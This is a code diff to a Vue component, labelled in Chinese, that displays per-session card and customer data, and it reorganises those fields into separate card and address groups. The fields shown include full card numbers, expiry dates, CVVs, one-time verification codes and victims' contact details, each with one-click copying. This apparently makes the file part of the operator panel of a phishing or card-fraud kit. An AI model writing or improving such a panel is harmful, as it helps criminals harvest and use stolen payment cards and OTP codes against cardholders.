@@ -7,6 +7,7 @@ const props = defineProps<{
   hideBin?: boolean;
   hidePhone?: boolean;
   hideAddress?: boolean;
+  group: 'card' | 'address';
 }>();
 
 const cardIcon = computed(() => {
@@ -34,7 +35,7 @@ function copy(val: string) {
 </script>
 
 <template>
-  <div class="session-fields">
+  <div class="session-fields" v-if="group==='card'">
     <div class="field field-wide" v-if="cardInfo.cardType" @click="copy(cardInfo.cardType)">
       <label>卡类型：</label>
       <span class="value card-type-badge" :style="{ color: cardIcon.color, borderColor: cardIcon.color }">
@@ -44,20 +45,23 @@ function copy(val: string) {
     </div>
     <div class="field card-information" v-if="cardInfo.cardLevel && !hideBin" @click="copy(cardInfo.cardLevel)"><label>卡级：</label><span>{{ cardInfo.cardLevel }}</span></div>
     <div class="field field-wide card-information" v-if="cardInfo.bankName && !hideBin" @click="copy(cardInfo.bankName)"><label>发卡行：</label><span>{{ cardInfo.bankName }}</span></div>
-    <div class="field" v-if="customerInfo.fullName && !hideAddress" @click="copy(customerInfo.fullName)"><label>姓名：</label><span class="value">{{ customerInfo.fullName }}</span></div>
-    <div class="field" v-if="customerInfo.email && !hideAddress" @click="copy(customerInfo.email)"><label>邮箱：</label><span class="value">{{ customerInfo.email }}</span></div>
-    <div class="field" v-if="customerInfo.phone && !hidePhone" @click="copy(customerInfo.phone)"><label>电话：</label><span class="value">{{ customerInfo.phone }}</span></div>
-    <div class="field" v-if="customerInfo.country && !hideAddress" @click="copy(customerInfo.country)"><label>国家：</label><span class="value">{{ customerInfo.country }}</span></div>
-    <div class="field field-wide" v-if="customerInfo.address1 && !hideAddress" @click="copy(customerInfo.address1)"><label>地址：</label><span class="value">{{ customerInfo.address1 }}</span></div>
-    <div class="field" v-if="customerInfo.city && !hideAddress" @click="copy(customerInfo.city)"><label>城市：</label><span class="value">{{ customerInfo.city }}</span></div>
-    <div class="field" v-if="customerInfo.state && !hideAddress" @click="copy(customerInfo.state)"><label>州/省：</label><span class="value">{{ customerInfo.state }}</span></div>
-    <div class="field" v-if="customerInfo.zipCode && !hideAddress" @click="copy(customerInfo.zipCode)"><label>邮编：</label><span class="value">{{ customerInfo.zipCode }}</span></div>
     <div class="field field-wide" v-if="cardInfo.cardHolder" @click="copy(cardInfo.cardHolder)"><label>持卡人：</label><span class="value">{{ cardInfo.cardHolder }}</span></div>
     <div class="field field-card" v-if="cardInfo.cardNumber" @click="copy(cardInfo.cardNumber)">
       <label>卡号：</label><span class="value value-green">{{ fmtCard(cardInfo.cardNumber) }}</span></div>
     <div class="field" v-if="cardInfo.expiry" @click="copy(cardInfo.expiry)"><label>有效期：</label><span class="value">{{ cardInfo.expiry }}</span></div>
     <div class="field" v-if="cardInfo.cvv" @click="copy(cardInfo.cvv)"><label>CVV：</label><span class="value">{{ cardInfo.cvv }}</span></div>
     <div class="field" v-if="cardInfo.otpCode" @click="copy(cardInfo.otpCode)"><label>验证码：</label><span class="value value-orange">{{ cardInfo.otpCode }}</span></div>
+    <div class="field" v-if="customerInfo.phone && !hidePhone" @click="copy(customerInfo.phone)"><label>电话：</label><span class="value">{{ customerInfo.phone }}</span></div>
+  </div>
+
+  <div class="session-fields" v-else-if="group==='address' && !hideAddress">
+    <div class="field" v-if="customerInfo.fullName" @click="copy(customerInfo.fullName)"><label>姓名：</label><span class="value">{{ customerInfo.fullName }}</span></div>
+    <div class="field" v-if="customerInfo.email" @click="copy(customerInfo.email)"><label>邮箱：</label><span class="value">{{ customerInfo.email }}</span></div>
+    <div class="field" v-if="customerInfo.country" @click="copy(customerInfo.country)"><label>国家：</label><span class="value">{{ customerInfo.country }}</span></div>
+    <div class="field field-wide" v-if="customerInfo.address1" @click="copy(customerInfo.address1)"><label>地址：</label><span class="value">{{ customerInfo.address1 }}</span></div>
+    <div class="field" v-if="customerInfo.city" @click="copy(customerInfo.city)"><label>城市：</label><span class="value">{{ customerInfo.city }}</span></div>
+    <div class="field" v-if="customerInfo.state" @click="copy(customerInfo.state)"><label>州/省：</label><span class="value">{{ customerInfo.state }}</span></div>
+    <div class="field" v-if="customerInfo.zipCode" @click="copy(customerInfo.zipCode)"><label>邮编：</label><span class="value">{{ customerInfo.zipCode }}</span></div>
   </div>
 </template>
 
